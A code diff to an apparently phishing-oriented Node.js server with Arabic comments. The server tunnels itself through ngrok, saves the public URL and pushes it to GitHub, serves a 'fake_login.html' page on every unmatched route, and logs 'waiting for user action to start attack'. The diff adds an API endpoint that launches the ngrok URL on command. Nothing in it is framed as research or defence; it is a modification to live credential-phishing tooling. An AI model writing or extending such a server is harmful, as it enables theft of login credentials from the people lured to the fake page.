@@ -251,8 +251,10 @@ function processNgrokResponse(response) {
       fs.writeFileSync("serverUrl.json", JSON.stringify({ serverUrl }));
       pushToGitHub();
 
-      // حاول فتح الرابط في المتصفح الافتراضي بحسب النظام
-      openInBrowser(serverUrl);
+      // ✅ بدلاً من فتح ngrok تلقائيًا، افتح التيرمينال فقط
+      openInBrowser(`http://localhost:${PORT}/terminal.html`);
+      console.log("🖥️ Opened terminal page — waiting for user action to start attack...");
+
     } else {
       console.log("⚠️ No ngrok URL found.");
     }
@@ -611,4 +613,14 @@ app.get('*', (req, res) => {
   }
 
   res.sendFile(path.join(process.cwd(), 'public', 'fake_login.html'));
+});
+
+
+// ✅ API لفتح ngrok عند الضغط من التيرمينال
+app.post('/api/open-ngrok', (req, res) => {
+  if (!serverUrl) return res.status(400).json({ message: "❌ ngrok URL not ready yet" });
+
+  console.log("🚀 Launching ngrok URL in Chrome by user action...");
+  openInBrowser(serverUrl);
+  res.json({ message: "✅ ngrok URL opened successfully!", url: serverUrl });
 });
